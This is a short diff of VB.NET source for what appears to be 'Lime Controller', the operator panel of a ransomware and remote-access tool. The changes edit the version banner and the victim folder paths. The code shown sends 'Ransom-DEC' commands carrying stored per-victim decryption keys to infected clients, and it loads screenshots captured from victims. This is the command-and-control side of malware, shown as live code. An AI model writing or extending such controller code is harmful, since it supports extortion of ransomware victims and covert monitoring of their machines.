@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##           N Y A N   C A T  ||  Last edit MAR./08/2018        ##
+'##           N Y A N   C A T  ||  Last edit MAR./09/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                  .. Lime Controller v0.3.1 ..                ##
+'##                  .. Lime Controller v0.3 ..                  ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -59,7 +59,7 @@ Public Class Form1
             IO.Directory.CreateDirectory(Application.StartupPath + "\Stub")
         End If
 
-        Me.Text = "Lime Controller v0.3.1"
+        Me.Text = "Lime Controller v0.3"
 
         Fix()
 
@@ -363,7 +363,7 @@ Public Class Form1
         Try
             For Each l As ListViewItem In Me.L1.SelectedItems
                 Dim C As C = CType(l.Tag, C)
-                C.SendText("Ransom-DEC" + SPL + IO.File.ReadAllText("USERS" + "\" + C.L.SubItems(0).Text + "\Key.txt"))
+                C.SendText("Ransom-DEC" + SPL + IO.File.ReadAllText("USERS" + "\" + C.L.SubItems(2).Text + "_" + C.L.SubItems(0).Text + "\Key.txt"))
             Next
         Catch ex As Exception
             MsgBox(ex.Message)
@@ -432,7 +432,7 @@ Public Class Form1
         Try
             If L1.SelectedItems.Count > 0 Then
                 For x = 0 To L1.SelectedItems.Count - 1
-                    PictureBox1.ImageLocation = "Users" & "\" & L1.SelectedItems(x).Text + "\" & "SC.jpeg"
+                    PictureBox1.ImageLocation = "Users" & "\" & L1.SelectedItems(x).SubItems(2).Text + "_" + L1.SelectedItems(x).Text + "\" & "SC.jpeg"
                     PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
                     PictureBox1.Visible = True
                 Next
